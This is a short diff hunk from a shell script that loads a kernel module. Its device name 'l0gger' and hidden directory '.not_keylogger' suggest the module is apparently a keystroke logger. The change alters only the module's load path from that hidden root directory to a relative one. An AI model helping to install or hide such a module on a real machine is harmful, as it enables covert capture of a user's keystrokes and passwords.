@@ -7,7 +7,7 @@ DEV=l0gger
 MODE=700
 
 echo "Loading module .."
-$INSMOD /root/.not_keylogger/"$MODULE".ko || exit 1
+$INSMOD "$MODULE".ko || exit 1
 
 rm -f /dev/$DEV
 
